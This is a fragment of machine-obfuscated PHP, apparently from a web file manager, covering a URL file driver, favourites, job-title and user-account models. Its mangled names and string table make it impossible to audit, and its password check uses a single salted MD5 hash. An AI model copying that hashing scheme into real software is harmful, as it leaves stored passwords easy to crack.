$ŠöÛ°â‚[$ªˆğªÛ[237]] : !1; } public function size($°¿öšãÙ) { $°òö¿àª = $this->objectMeta($°¿öšãÙ); return $°òö¿àª ? $°òö¿àª[$_SERVER[ˆûùúÊ¯][86]] : 0; } public function info($ÈÕï¢«³) { if ($this->isFolder($ÈÕï¢«³)) { return $this->folderInfo($ÈÕï¢«³); } else { if ($this->isFile($ÈÕï¢«³)) { return $this->fileInfo($ÈÕï¢«³); } } return !1; } public function exist($§üÑ¥“Ù) { return $this->isFile($§üÑ¥“Ù) || $this->isFolder($§üÑ¥“Ù); } public function isFile($ĞøÖ·¿±) { return !$this->isFolder($ĞøÖ·¿±) && $this->objectMeta($ĞøÖ·¿±); } public function isFolder($½ı¿´â¦) { return $this->cacheMethod($_SERVER[ˆûùúÊ¯][175], $½ı¿´â¦); } protected function objectMeta($…³·¿í¦) { return $this->cacheMethod($_SERVER[ˆûùúÊ¯][177], $…³·¿í¦); } protected function _objectMeta($¹”‡Œ½ğ) { $÷Í”…û =& $_SERVER[ˆûùúÊ¯]; if ($¹”‡Œ½ğ == $÷Í”…û[12] || $¹”‡Œ½ğ == $÷Í”…û[8]) { return array(); } $£Á‰…öñ = $this->ussRequest($¹”‡Œ½ğ, $÷Í”…û[1539]); if (!$£Á‰…öñ[$÷Í”…û[1273]]) { return null; } $¹ş»Û˜Ù = isset($£Á‰…öñ[$÷Í”…û[1263]]) ? $£Á‰…öñ[$÷Í”…û[1263]] : array(); if (!isset($¹ş»Û˜Ù[$÷Í”…û[1540]])) { return null; } $»ïı–ù‚ = array($÷Í”…û[43] => isset($¹ş»Û˜Ù[$÷Í”…û[1540]]) ? $¹ş»Û˜Ù[$÷Í”…û[1540]] : null, $÷Í”…û[86] => isset($¹ş»Û˜Ù[$÷Í”…û[1541]]) ? $¹ş»Û˜Ù[$÷Í”…û[1541]] : null, $÷Í”…û[237] => isset($¹ş»Û˜Ù[$÷Í”…û[1542]]) ? $¹ş»Û˜Ù[$÷Í”…û[1542]] : null, $÷Í”…û[1509] => isset($¹ş»Û˜Ù[$÷Í”…û[1543]]) ? $¹ş»Û˜Ù[$÷Í”…û[1543]] : null); $»ïı–ù‚[$÷Í”…û[1510]] = isset($¹ş»Û˜Ù[$÷Í”…û[1544]]) ? strtotime($¹ş»Û˜Ù[$÷Í”…û[1544]]) : $»ïı–ù‚[$÷Í”…û[1509]]; return $»ïı–ù‚; } protected function _isFolder($ĞÕ¸•ó¤) { $ê´ãÖ‡‰ =& $_SERVER[ˆûùúÊ¯]; if ($ĞÕ¸•ó¤ == $ê´ãÖ‡‰[12] || $ĞÕ¸•ó¤ == $ê´ãÖ‡‰[8]) { return !0; } $ ñ“˜–Ã = $this->_objectMeta($ĞÕ¸•ó¤); return isset($ ñ“˜–Ã[$ê´ãÖ‡‰[43]]) && $ ñ“˜–Ã[$ê´ãÖ‡‰[43]] == $ê´ãÖ‡‰[85] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($î†Ò·ıÕ = false) { } public function exist($•µ•áì) { $Íüğ™ì¨ = $this->info($•µ•áì); return $Íüğ™ì¨[$_SERVER[ˆûùúÊ¯][225]]; } public function isFile($ê»…ö«) { $íØ—éÑ¤ = $this->info($ê»…ö«); return $íØ—éÑ¤[$_SERVER[ˆûùúÊ¯][225]]; } public function isFolder($Š²„Òºœ) { return !1; } public function size($õè¦À«) { $ú¸âé¬á = $this->info($õè¦À«); return $ú¸âé¬á[$_SERVER[ˆûùúÊ¯][86]]; } public function info($ë¾¼©÷Ú) { return $this->infoParse($ë¾¼©÷Ú); } public function infoAuth($Ş¦úÛ’˜) { return $this->infoParse($Ş¦úÛ’˜); } public function infoWithChildren($Æ‘·Çş­) { return $this->infoParse($Æ‘·Çş­); } public function infoFull($åƒ¾ÅÖ) { return $this->infoParse($åƒ¾ÅÖ); } private function infoParse($ğÓÔĞîÉ) { $ÔÁ¥´¹Ç =& $_SERVER[ˆûùúÊ¯]; $¸á‚¹ŠÆ = $this->header($ğÓÔĞîÉ); if (!$¸á‚¹ŠÆ || !$¸á‚¹ŠÆ[$ÔÁ¥´¹Ç[810]]) { return !1; } $á»„Ûˆõ = _get($¸á‚¹ŠÆ, $ÔÁ¥´¹Ç[389], 0); $ĞñùÎŠ = array($ÔÁ¥´¹Ç[42] => $¸á‚¹ŠÆ[$ÔÁ¥´¹Ç[42]], $ÔÁ¥´¹Ç[94] => $ğÓÔĞîÉ, $ÔÁ¥´¹Ç[43] => $ÔÁ¥´¹Ç[223], $ÔÁ¥´¹Ç[86] => intval($á»„Ûˆõ), $ÔÁ¥´¹Ç[184] => get_path_ext($¸á‚¹ŠÆ[$ÔÁ¥´¹Ç[42]]), $ÔÁ¥´¹Ç[1423] => $á»„Ûˆõ > 0 && $¸á‚¹ŠÆ[$ÔÁ¥´¹Ç[1545]], $ÔÁ¥´¹Ç[1424] => !1); return $ĞñùÎŠ; } private function header($€²ößÆ) { $”ª€ò¾ı =& $_SERVER[ˆûùúÊ¯]; if (isset(self::$_cacheHeader[$€²ößÆ])) { return self::$_cacheHeader[$€²ößÆ]; } $†œ½¡¶İ = isset($GLOBALS[$”ª€ò¾ı[1546]]) ? $GLOBALS[$”ª€ò¾ı[1546]] : !1; $GLOBALS[$”ª€ò¾ı[1546]] = !0; self::$_cacheHeader[$€²ößÆ] = url_header($€²ößÆ); $GLOBALS[$”ª€ò¾ı[1546]] = $†œ½¡¶İ; return self::$_cacheHeader[$€²ößÆ]; } public function hashSimple($«¤ÌîÒ‚, $…èÅÑ» = false) { $Ãõ·ôÉæ =& $_SERVER[ˆûùúÊ¯]; $¨ï”Õ”Ä = $this->info($«¤ÌîÒ‚); if (!$¨ï”Õ”Ä || !$¨ï”Õ”Ä[$Ãõ·ôÉæ[225]]) { return !1; } $Ë¦Ã­¡Á = $¨ï”Õ”Ä[$Ãõ·ôÉæ[86]]; $¨°ï¡ùÕ = 200; $€¿Æ‚ = 50; if ($Ë¦Ã­¡Á <= $¨°ï¡ùÕ * $€¿Æ‚) { return md5($this->fileSubstr($«¤ÌîÒ‚, 0, $Ë¦Ã­¡Á)) . $Ë¦Ã­¡Á; } $½Ç†»åö = intval($Ë¦Ã­¡Á / $€¿Æ‚); $ğ‰è¡…· = $Ãõ·ôÉæ[12]; $áùÀñö¼ = timeFloat(); $½ÈÌ˜á§ = 15; for ($İè²”¤» = 0; $İè²”¤» < $€¿Æ‚; $İè²”¤»++) { if (timeFloat() - $áùÀñö¼ > $½ÈÌ˜á§) { return !1; } $ú“õä†‹ = $this->fileSubstr($«¤ÌîÒ‚, $½Ç†»åö * $İè²”¤», $¨°ï¡ùÕ); if (!$ú“õä†‹) { return !1; } $ğ‰è¡…· .= $ú“õä†‹; } $ğ‰è¡…· .= $this->fileSubstr($«¤ÌîÒ‚, $Ë¦Ã­¡Á - $¨°ï¡ùÕ, $¨°ï¡ùÕ); return md5($ğ‰è¡…·) . $Ë¦Ã­¡Á; } public function getContent($ö¨¹À…³) { return $this->fileSubstr($ö¨¹À…³); } public function fileSubstr($ûŸÚ÷û, $¥šÍæ¥È = 0, $óîÚ¨ÏØ = -1) { $³Üœ‘ ” =& $_SERVER[ˆûùúÊ¯]; $»¶¹ßê = $this->info($ûŸÚ÷û); if (!$»¶¹ßê || !$»¶¹ßê[$³Üœ‘ ”[225]] && $»¶¹ßê[$³Üœ‘ ”[86]] > 1024 * 1024 * 10) { return !1; } if ($óîÚ¨ÏØ === -1) { $óîÚ¨ÏØ = $»¶¹ßê[$³Üœ‘ ”[86]]; } if ($óîÚ¨ÏØ == 0) { return $³Üœ‘ ”[12]; } $ËµÍØÒ = array($³Üœ‘ ”[1547] . $¥šÍæ¥È . $³Üœ‘ ”[842] . ($¥šÍæ¥È + $óîÚ¨ÏØ - 1)); $òà¢š¨Â = url_request($ûŸÚ÷û, $³Üœ‘ ”[254], !1, $ËµÍØÒ, !1, !1, 30); return $òà¢š¨Â[$³Üœ‘ ”[1263]] ? $òà¢š¨Â[$³Üœ‘ ”[1263]] : $³Üœ‘ ”[12]; } public function download($ÈŠÔãğÏ, $é¤Ûø¿¬) { Downloader::start($ÈŠÔãğÏ, $é¤Ûø¿¬); return $é¤Ûø¿¬; } } goto B©ÄÄˆ°ßÖ; AÉÏÚ…í£: class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\x5f\x66\141\x76"; protected function cacheFunctionAlias($øÖª¶á¡) { $ïÓä—ƒ¿ =& $_SERVER[ˆûùúÊ¯]; return array($ïÓä—ƒ¿[2007] => array(USER_ID, $ïÓä—ƒ¿[2345])); } protected function listData() { $ßµİÉ¿Ñ =& $_SERVER[ˆûùúÊ¯]; $Â Ú€»¢ = array($ßµİÉ¿Ñ[1695] => USER_ID, $ßµİÉ¿Ñ[533] => 0); $‡É–¶” = $ßµİÉ¿Ñ[2346]; $ãúà™Œ = $this->field($‡É–¶”)->where($Â Ú€»¢)->order($ßµİÉ¿Ñ[2347])->select(); return $ãúà™Œ ? $ãúà™Œ : array(); } protected function resetCache() { } protected function listView() { $ºö² =& $_SERVER[ˆûùúÊ¯]; $Ã”àæú„ = $this->listData(); $Öè¡”¤ = array_filter_by_field($Ã”àæú„, $ºö²[43], $ºö²[466]); $±½úá†ø = array_to_keyvalue($Öè¡”¤, $ºö²[12], $ºö²[94]); if (!$±½úá†ø) { return $Ã”àæú„; } $¿êÉö­¨ = 2000; $µŸÖİª© = array($ºö²[467] => array($ºö²[468], $±½úá†ø)); $ªë —Ç  = Model($ºö²[885])->listSource($µŸÖİª©, $¿êÉö­¨); $ªë —Ç  = array_merge($ªë —Ç [$ºö²[93]], $ªë —Ç [$ºö²[92]]); $ªë —Ç  = array_to_keyvalue($ªë —Ç , $ºö²[190]); foreach ($Ã”àæú„ as $¼„îÆÏà => $›“Ÿüº¾) { $ô–üäŠ = $ªë —Ç [$›“Ÿüº¾[$ºö²[94]]]; $ô–üäŠ = $ô–üäŠ ? $ô–üäŠ : array(); $Ã”àæú„[$¼„îÆÏà] = array_merge($ô–üäŠ, $›“Ÿüº¾); } return $Ã”àæú„; } protected function addFav($ŞØòê¢¹, $ˆÔöÂ¥ğ = '', $½†÷ğÀî = "\x73\157\165\x72\x63\x65") { $ïÀ¸òî =& $_SERVER[ˆûùúÊ¯]; $Ä›ïÇ†” = array($ïÀ¸òî[1695] => USER_ID, $ïÀ¸òî[533] => 0, $ïÀ¸òî[472] => $½†÷ğÀî, $ïÀ¸òî[471] => $ŞØòê¢¹); if ($this->where($Ä›ïÇ†”)->find()) { return !1; } $Ä›ïÇ†” = array($ïÀ¸òî[1695] => USER_ID, $ïÀ¸òî[533] => 0); $±ëš¤ = $this->where($Ä›ïÇ†”)->max($ïÀ¸òî[1920]); if (!$±ëš¤) { $±ëš¤ = 0; } if (!$ˆÔöÂ¥ğ && $½†÷ğÀî == $ïÀ¸òî[466]) { $ÉˆôéÀ‰ = Model($ïÀ¸òî[1393])->where(array($ïÀ¸òî[467] => $ŞØòê¢¹))->find(); if (!$ÉˆôéÀ‰) { return !1; } $ˆÔöÂ¥ğ = $ÉˆôéÀ‰[$ïÀ¸òî[42]]; } $ˆÔöÂ¥ğ = $this->getAutoName($ˆÔöÂ¥ğ); $ìä®ğÓ¡ = array($ïÀ¸òî[1695] => USER_ID, $ïÀ¸òî[533] => 0, $ïÀ¸òî[470] => $ˆÔöÂ¥ğ, $ïÀ¸òî[471] => $ŞØòê¢¹, $ïÀ¸òî[472] => $½†÷ğÀî, $ïÀ¸òî[1900] => $±ëš¤ + 1); return $this->add($ìä®ğÓ¡); } protected function remove($–ïÛäû•) { $ÀÃ¼¿áŠ =& $_SERVER[ˆûùúÊ¯]; $†ıŠÁ¥Ä = array($ÀÃ¼¿áŠ[1695] => USER_ID, $ÀÃ¼¿áŠ[469] => $–ïÛäû•); return $this->where($†ıŠÁ¥Ä)->delete(); } protected function removeByName($Éå¡™£Û) { $ğ°ûëÃ® =& $_SERVER[ˆûùúÊ¯]; $²á•âˆ‚ = array($ğ°ûëÃ®[1695] => USER_ID, $ğ°ûëÃ®[470] => $Éå¡™£Û, $ğ°ûëÃ®[533] => 0); return $this->where($²á•âˆ‚)->delete(); } protected function rename($è¸ƒ¥åù, $ÏÇˆß”) { $µ‚¥«øé =& $_SERVER[ˆûùúÊ¯]; if ($è¸ƒ¥åù == $ÏÇˆß”) { return !1; } $´ßî—óÈ = $this->getAutoName($ÏÇˆß”); if ($ÏÇˆß” != $´ßî—óÈ) { return !1; } $Äò×äğş = array($µ‚¥«øé[1695] => USER_ID, $µ‚¥«øé[533] => 0, $µ‚¥«øé[42] => $è¸ƒ¥åù); return $this->where($Äò×äğş)->save(array($µ‚¥«øé[42] => $ÏÇˆß”)); } protected function resetSort($ìëï£ğú) { $Óà¬ŠÃØ =& $_SERVER[ˆûùúÊ¯]; $ìëï£ğú = is_array($ìëï£ğú) ? $ìëï£ğú : array(); $×Ö«Êµû = array($Óà¬ŠÃØ[1695] => USER_ID); for ($š˜É×Ş = 0; $š˜É×Ş < count($ìëï£ğú); $š˜É×Ş++) { $×Ö«Êµû[$Óà¬ŠÃØ[469]] = $ìëï£ğú[$š˜É×Ş]; $this->where($×Ö«Êµû)->save(array($Óà¬ŠÃØ[1900] => $š˜É×Ş + 1)); } return !0; } protected function moveTop($‚ŒĞåæ) { $˜Ï«”ÃÛ =& $_SERVER[ˆûùúÊ¯]; $ã¸á„Ş = array($˜Ï«”ÃÛ[1695] => USER_ID, $˜Ï«”ÃÛ[533] => 0); $ùÂÀ•ığ = $this->where($ã¸á„Ş)->where(array($˜Ï«”ÃÛ[42] => $‚ŒĞåæ))->find(); if (!$ùÂÀ•ığ) { return; } $ñÃÑüß = $this->field($˜Ï«”ÃÛ[451])->where($ã¸á„Ş)->order($˜Ï«”ÃÛ[2347])->select(); $ñÃÑüß = array_to_keyvalue($ñÃÑüß, $˜Ï«”ÃÛ[12], $˜Ï«”ÃÛ[451]); $ñÜ¤½â¾ = $ñÃÑüß; $ñÃÑüß = array_remove_value($ñÃÑüß, $ùÂÀ•ığ[$˜Ï«”ÃÛ[451]]); array_unshift($ñÃÑüß, $ùÂÀ•ığ[$˜Ï«”ÃÛ[451]]); return $this->resetSort($ñÃÑüß); } protected function moveBottom($Ú¥–Ïöƒ) { $Œ«×ùŸ =& $_SERVER[ˆûùúÊ¯]; $°¯ê·œñ = array($Œ«×ùŸ[1695] => USER_ID, $Œ«×ùŸ[533] => 0); $åƒ¯Ã®Š = $this->where($°¯ê·œñ)->max($Œ«×ùŸ[1920]); $ ÕÒÎ´Á = array($Œ«×ùŸ[1920] => $åƒ¯Ã®Š + 1); return $this->where($°¯ê·œñ)->where(array($Œ«×ùŸ[42] => $Ú¥–Ïöƒ))->save($ ÕÒÎ´Á); } private function getAutoName($Æ›¹òÜß) { $¡šÑ‘£ =& $_SERVER[ˆûùúÊ¯]; $ùŠŠ¼ÙÊ = array($¡šÑ‘£[1695] => USER_ID, $¡šÑ‘£[533] => 0); $ËÏ“×»  = $this->field($¡šÑ‘£[42])->where($ùŠŠ¼ÙÊ)->select(); $ËÏ“×»  = array_to_keyvalue($ËÏ“×» , $¡šÑ‘£[12], $¡šÑ‘£[42]); if (!$ËÏ“×»  || !in_array($Æ›¹òÜß, $ËÏ“×» )) { return $Æ›¹òÜß; } for ($´«‚ñÊó = 0; $´«‚ñÊó < count($ËÏ“×» ); $´«‚ñÊó++) { if (!in_array($Æ›¹òÜß . "\x28{$´«‚ñÊó}\x29", $ËÏ“×» )) { return $Æ›¹òÜß . "\x28{$´«‚ñÊó}\51"; } } return $Æ›¹òÜß . "\50{$´«‚ñÊó}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\155\56\152\x6f\x62\114\x69\x73\164"; public $field = array("\156\141\155\x65", "\144\x65\163\143", "\x73\157\162\x74"); const JOB_KEY = "\x73\x65\x6c\146\x4a\157\x62\x4c\x69\x73\164"; public function listData($ôŒş¸€ = false, $¬¹î„ë = "\163\x6f\x72\x74", $áãÕ öŒ = false) { return parent::listData($ôŒş¸€, $¬¹î„ë, $áãÕ öŒ); } public function remove($µÏà€­) { return parent::remove($µÏà€­); } public function add($ö›Ä¥ú) { $€†£»»® =& $_SERVER[ˆûùúÊ¯]; if ($this->findByName($ö›Ä¥ú[$€†£»»®[42]])) { return !1; } $ö›Ä¥ú[$€†£»»®[1920]] = $this->getSort(); return parent::insert($ö›Ä¥ú); } private function getSort() { $·Š£ˆ˜ç =& $_SERVER[ˆûùúÊ¯]; $†®ë”ßÏ = parent::listData(); $Â¨™Ûô = array_to_keyvalue($†®ë”ßÏ, $·Š£ˆ˜ç[12], $·Š£ˆ˜ç[1920]); return empty($Â¨™Ûô) ? 0 : max($Â¨™Ûô) + 1; } public function update($ÙáÂßğš, $ÔÊáÄï†) { $ñ…¬´Ÿ¡ =& $_SERVER[ˆûùúÊ¯]; $†ÒÄÊ¬ô = parent::listData($ÙáÂßğš); $ĞÑå“Ã = $this->findByName($ÔÊáÄï†[$ñ…¬´Ÿ¡[42]]); if (!$†ÒÄÊ¬ô || $ĞÑå“Ã && $ĞÑå“Ã[$ñ…¬´Ÿ¡[451]] != $†ÒÄÊ¬ô[$ñ…¬´Ÿ¡[451]]) { return !1; } return parent::update($ÙáÂßğš, $ÔÊáÄï†); } public function setUserJob($¸¸•Ÿæô, $É¬¿ƒıÃ) { $ñÜû§¿· =& $_SERVER[ˆûùúÊ¯]; if (!is_array($É¬¿ƒıÃ)) { $É¬¿ƒıÃ = array($É¬¿ƒıÃ); } $ó•öÄÔ = parent::listData(); $×ò¹¾ä÷ = array_to_keyvalue($ó•öÄÔ, $ñÜû§¿·[42]); $âÛ¿öÍØ = $ñÜû§¿·[430]; foreach ($É¬¿ƒıÃ as $‡©É”ÃŒ) { if ($×ò¹¾ä÷[$‡©É”ÃŒ]) { $âÛ¿öÍØ .= $×ò¹¾ä÷[$‡©É”ÃŒ][$ñÜû§¿·[451]] . $ñÜû§¿·[60]; } else { $¢Ï¾Ë™Ñ = $this->add($‡©É”ÃŒ); $âÛ¿öÍØ .= $¢Ï¾Ë™Ñ . $ñÜû§¿·[60]; } } $âÛ¿öÍØ = rtrim($âÛ¿öÍØ, $ñÜû§¿·[60]); Model($ñÜû§¿·[575])->metaSet($¸¸•Ÿæô, self::JOB_KEY, $âÛ¿öÍØ); } public function getUserJob($¢¹¾ç§Ÿ) { $ä“ê·»µ = Model($_SERVER[ˆûùúÊ¯][575])->metaGet($¢¹¾ç§Ÿ); return $this->getUserJobInfo($ä“ê·»µ[self::JOB_KEY]); } public function getUserJobInfo($­–š˜ã¹) { $õ¼İÂí =& $_SERVER[ˆûùúÊ¯]; $¶û²İ¾Ö = explode($õ¼İÂí[60], $­–š˜ã¹); $Ü¢¤— = parent::listData(); $Ü¢¤— = array_remove_key($Ü¢¤—, $õ¼İÂí[224]); $šåÜıº¥ = array(); foreach ($¶û²İ¾Ö as $«£©»Å¡) { if (isset($Ü¢¤—[$«£©»Å¡])) { $šåÜıº¥[] = $Ü¢¤—[$«£©»Å¡]; } } return $šåÜıº¥; } } class UserModel extends ModelBase { protected $tableName = "\165\163\x65\162"; protected $tableMeta = array("\164\141\142\x6c\145\x4e\x61\155\145" => "\165\x73\x65\162\137\155\145\x74\x61", "\x6d\x65\164\141\106\151\145\x6c\144" => "\x75\x73\x65\162\111\104"); protected $simpleField = "\165\x73\x65\x72\111\x44\54\156\151\x63\x6b\x4e\141\155\145\x2c\x6e\x61\x6d\145\x2c\141\166\x61\x74\x61\x72\54\x73\145\170\x2c\x73\164\141\x74\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($à ç“î) { $™´Ú’Í =& $_SERVER[ˆûùúÊ¯]; $£¤Æ™’ß = $™´Ú’Í[2348]; return array($™´Ú’Í[1974] => array($à ç“î[0], $£¤Æ™’ß), $™´Ú’Í[1976] => array($à ç“î[0], $£¤Æ™’ß), $™´Ú’Í[2349] => array($à ç“î[0], $£¤Æ™’ß)); } protected function getInfo($æğ–ğÙ…, $ïìè˜”à = false) { $°×»Ë± = $this->getInfoSimple($æğ–ğÙ…); if (!is_array($°×»Ë±)) { return array(); } if ($ïìè˜”à) { return $this->_getInfoApply($°×»Ë±); } return $this->cacheFunctionGet($_SERVER[ˆûùúÊ¯][1978], $æğ–ğÙ…); } protected function getInfoFull($“Û•¶ÓÁ, $¾ÏÏ×ì¯ = false) { $³Ïì’É = $this->getInfoSimple($“Û•¶ÓÁ); if (!is_array($³Ïì’É)) { return array(); } if ($¾ÏÏ×ì¯) { return $this->_getInfoApply($³Ïì’É, !0); } return $this->cacheFunctionGet($_SERVER[ˆûùúÊ¯][2350], $“Û•¶ÓÁ); } private function _getInfoApply($ÀÂ¢âäÊ, $ü»ä¾ = false) { $ĞÉ®úåÀ =& $_SERVER[ˆûùúÊ¯]; if (!$ÀÂ¢âäÊ) { return $ÀÂ¢âäÊ; } $Š–¥Õ‘ü = md5($ĞÉ®úåÀ[2351] . $ÀÂ¢âäÊ[$ĞÉ®úåÀ[950]] . $ĞÉ®úåÀ[2352] . $ÀÂ¢âäÊ[$ĞÉ®úåÀ[42]]); $ÀÂ¢âäÊ = $this->_listDataApplyItem($ÀÂ¢âäÊ); $¥±Èôäñ = Model($ĞÉ®úåÀ[1393])->metaGet($ÀÂ¢âäÊ[$ĞÉ®úåÀ[97]][$ĞÉ®úåÀ[190]]); $ÀÂ¢âäÊ[$ĞÉ®úåÀ[2353]] = $Š–¥Õ‘ü; $ÀÂ¢âäÊ[$ĞÉ®úåÀ[97]][$ĞÉ®úåÀ[2170]] = isset($¥±Èôäñ[$ĞÉ®úåÀ[2171]]) ? $¥±Èôäñ[$ĞÉ®úåÀ[2171]] : null; if ($ü»ä¾) { $ÀÂ¢âäÊ[$ĞÉ®úåÀ[515]] = $this->metaGet($ÀÂ¢âäÊ[$ĞÉ®úåÀ[1704]]); } return $ÀÂ¢âäÊ; } protected function getInfoSimple($›øîÅ‘§, $¯òçšÀ = false) { $ÃÜ†‹•¡ =& $_SERVER[ˆûùúÊ¯]; if (!$›øîÅ‘§) { return array(); } if ($¯òçšÀ) { $¤½¤Ïóà = $this->where(array($ÃÜ†‹•¡[1704] => intval($›øîÅ‘§)))->find(); if (!is_array($¤½¤Ïóà)) { return array(); } $¤½¤Ïóà[$ÃÜ†‹•¡[2354]] = Action($ÃÜ†‹•¡[2355])->parseUrl($¤½¤Ïóà[$ÃÜ†‹•¡[2354]]); return $¤½¤Ïóà; } return $this->cacheFunctionGet($ÃÜ†‹•¡[1979], $›øîÅ‘§); } protected function getInfoSimpleOuter($‹£°ÍÂš) { $‹ä„ÌÑ— =& $_SERVER[ˆûùúÊ¯]; if (!$‹£°ÍÂš || $‹£°ÍÂš == 0) { return array($‹ä„ÌÑ—[1704] => $‹ä„ÌÑ—[221], $‹ä„ÌÑ—[42] => $‹ä„ÌÑ—[172] . LNG($‹ä„ÌÑ—[2356]) . $‹ä„ÌÑ—[174], $‹ä„ÌÑ—[2354] => STATIC_PATH . $‹ä„ÌÑ—[2357]); } $ªÄÙ¶­ = $this->cacheFunctionGet($‹ä„ÌÑ—[1979], $‹£°ÍÂš); $“ÃÜÈ = array_field_key($ªÄÙ¶­, explode($‹ä„ÌÑ—[60], $this->simpleField)); if (!$“ÃÜÈ) { return array($‹ä„ÌÑ—[1704] => $‹ä„ÌÑ—[1249], $‹ä„ÌÑ—[42] => $‹ä„ÌÑ—[172] . LNG($‹ä„ÌÑ—[2358]) . $‹ä„ÌÑ—[174], $‹ä„ÌÑ—[2354] => STATIC_PATH . $‹ä„ÌÑ—[2359]); } $“ÃÜÈ[$‹ä„ÌÑ—[2354]] = Action($‹ä„ÌÑ—[2355])->parseUrl($“ÃÜÈ[$‹ä„ÌÑ—[2354]]); return $“ÃÜÈ; } protected function groupUser($İ·„ç„‹) { } public static function errorLang($¤ÛäÇ¬Î) { $¾£†‡Ÿñ =& $_SERVER[ˆûùúÊ¯]; $£¯•Úä = array(self::ERROR_USER_NOT_EXISTS => $¾£†‡Ÿñ[2360], self::ERROR_USER_PASSWORD_ERROR => $¾£†‡Ÿñ[2361], self::ERROR_USER_EXIST_NAME => $¾£†‡Ÿñ[2362], self::ERROR_USER_EXIST_PHONE => $¾£†‡Ÿñ[2363], self::ERROR_USER_EXIST_EMAIL => $¾£†‡Ÿñ[2364], self::ERROR_USER_LOGIN_LOCK => $¾£†‡Ÿñ[2365], self::ERROR_IP_NOT_ALLOW => $¾£†‡Ÿñ[2366], self::ERROR_USER_EXIST_NICKNAME => $¾£†‡Ÿñ[2367]); return LNG($£¯•Úä[$¤ÛäÇ¬Î]); } public function getInfoByMeta($°é¡ô‰ö, $ß«Ş™²) { $õ­‘àÏâ =& $_SERVER[ˆûùúÊ¯]; $ï¿öñ = Model($õ­‘àÏâ[2368])->where(array($õ­‘àÏâ[104] => $°é¡ô‰ö, $õ­‘àÏâ[426] => $ß«Ş™²))->find(); if ($ï¿öñ) { return $this->getInfo($ï¿öñ[$õ­‘àÏâ[1704]]); } return !1; } public function userLoginCheck($Â×Ñ‡ğà, $º§èÚ“Ú) { $¨ë„³® =& $_SERVER[ˆûùúÊ¯]; $¢à´¢¿ = $this->userLoginFind($Â×Ñ‡ğà); if (!$¢à´¢¿) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($¢à´¢¿[$¨ë„³®[1704]], $º§èÚ“Ú)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($¢à´¢¿[$¨ë„³®[1704]]); } public function userLoginFind($ï–‰Š³) { $ãÅÍ—ã =& $_SERVER[ˆûùúÊ¯]; $ÀÄéçì² = array($ãÅÍ—ã[42] => $ï–‰Š³, $ãÅÍ—ã[2178] => $ï–‰Š³, $ãÅÍ—ã[357] => $ï–‰Š³, $ãÅÍ—ã[2369] => $ï–‰Š³, $ãÅÍ—ã[1061] => $ãÅÍ—ã[1063]); if ($this->nickNameRpt()) { unset($ÀÄéçì²[$ãÅÍ—ã[2178]]); } return $this->where($ÀÄéçì²)->find(); } public function clearCache($¨Ç×¨³Ñ) { $ÈöÊˆËÇ =& $_SERVER[ˆûùúÊ¯]; $this->cacheFunctionClear($ÈöÊˆËÇ[1978], $¨Ç×¨³Ñ); $this->cacheFunctionClear($ÈöÊˆËÇ[1979], $¨Ç×¨³Ñ); $this->cacheFunctionClear($ÈöÊˆËÇ[2350], $¨Ç×¨³Ñ); } public function userPasswordCheck($åÍòˆ , $ó×ıöèŸ) { $Ãü×òÉâ =& $_SERVER[ˆûùúÊ¯]; $·’Ä«…‰ = $this->where(array($Ãü×òÉâ[1704] => intval($åÍòˆ )))->find(); $ò·üÌ•¿ = $this->metaGet($åÍòˆ ); $ÄîÍÍ‚Û = isset($ò·üÌ•¿[$Ãü×òÉâ[2370]]) ? $ò·üÌ•¿[$Ãü×òÉâ[2370]] : $Ãü×òÉâ[12]; if (md5($ÄîÍÍ‚Û . trim($ó×ıöèŸ)) !== $·’Ä«…‰[$Ãü×òÉâ[950]]) { return !1; } return !0; } public function userAdd($²„•ˆì) { $û‰³á–Ş =& $_SERVER[ˆûùúÊ¯]; $‚ÅÂ×«• = array($û‰³á–Ş[470] => $²„•ˆì[$û‰³á–Ş[42]], $û‰³á–Ş[2371] => $²„•ˆì[$û‰³á–Ş[1579]], $û‰³á–Ş[2372] => isset($²„•ˆì[$û‰³á–Ş[357]]) ? $²„•ˆì[$û‰³á–Ş[357]] : $û‰³á–Ş[12], $û‰³á–Ş[2373] => isset($²„•ˆì[$û‰³á–Ş[2369]]) ? $²„•ˆì[$û‰³á–Ş[2369]] : $û‰³á–Ş[12], $û‰³á–Ş[2374] => isset($²„•ˆì[$û‰³á–Ş[2178]]) ? $²„•ˆì[$û‰³á–Ş[2178]] : $²„•ˆì[$û‰³á–Ş[42]], $û‰³á–Ş[2375] => isset($²„•ˆì[$û‰³á–Ş[2354]]) ? $²„•ˆì[$û‰³á–Ş[2354]] : $û‰³á–Ş[12], $û‰³á–Ş[2376] => isset($²„•ˆì[$û‰³á–Ş[2377]]) ? $²„•ˆì[$û‰³á–Ş[2377]] : 1, $û‰³á–Ş[2378] => $²„•ˆì[$û‰³á–Ş[950]], $û‰³á–Ş[1980] => isset($²„•ˆì[$û‰³á–Ş[1883]]) ? $²„•ˆì[$û‰³á–Ş[1883]] : 1024 * 1024 * 20, $û‰³á–Ş[1981] => 0, $û‰³á–Ş[2379] => 0, $û‰³á–Ş[2025] => isset($²„•ˆì[$û‰³á–Ş[810]]) ? $²„•ˆì[$û‰³á–Ş[810]] : 1); if (!empty($²„•ˆì[$û‰³á–Ş[1704]])) { $‚ÅÂ×«•[$û‰³á–Ş[1704]] = $²„•ˆì[$û‰³á–Ş[1704]]; } $ÇŒ×§è¸ = $this->_checkExist($²„•ˆì); if ($ÇŒ×§è¸ !== !0) { return $ÇŒ×§è¸; } if (!empty($‚ÅÂ×«•[$û‰³á–Ş[2354]]) && strlen($‚ÅÂ×«•[$û‰³á–Ş[2354]]) > 255) { $‚ÅÂ×«•[$û‰³á–Ş[2354]] = $û‰³á–Ş[12]; } $Ó•êÑÆÃ = $this->add($‚ÅÂ×«•); $§ŒÄ±¾„ = array($û‰³á–Ş[2378] => $‚ÅÂ×«•[$û‰³á–Ş[950]], 